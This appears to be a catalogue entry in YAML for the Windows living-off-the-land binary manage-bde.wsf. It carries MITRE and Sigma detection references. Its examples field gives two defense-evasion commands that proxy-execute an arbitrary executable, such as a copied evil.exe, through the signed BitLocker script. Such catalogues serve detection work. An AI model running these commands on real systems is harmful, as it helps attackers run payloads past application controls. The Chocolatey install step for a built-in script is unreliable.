---
id: windows-execution-manage-bde
namespace: windows:execution:manage-bde
name: manage-bde
description: 'Script for managing BitLocker Located at: C:\Windows\System32\manage-bde.wsf.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- manage-bde
parameters: []
features:
- pipes-stdin
- pipes-stdout
execution:
  template: manage-bde
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Set the comspec variable to another executable prior to calling manage-bde.wsf
    for execution. (Proxy execution from script)
  command: set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
- description: Run the manage-bde.wsf script with a payload named manage-bde.exe in
    the same directory to run the payload file. (Proxy execution from script)
  command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\
    & cscript.exe c:\windows\system32\manage-bde.wsf
references:
- label: 735edb7494fe1bd1010d67823842b712
  url: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
- label: '980659399495741441'
  url: https://twitter.com/bohops/status/980659399495741441
- label: '1223292479270600706'
  url: https://twitter.com/JohnLaTwC/status/1223292479270600706
techniques:
- execution
- defense-evasion
mitre_ids:
- T1216
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
- type: ioc
  description: Manage-bde.wsf should not be invoked by a standard user under normal
    situations
install:
- method: choco
  package_name: manage-bde
  commands:
  - choco install manage-bde
---

# manage-bde

manage-bde is a Windows LOLBin. Script for managing BitLocker Located at: C:\Windows\System32\manage-bde.wsf.
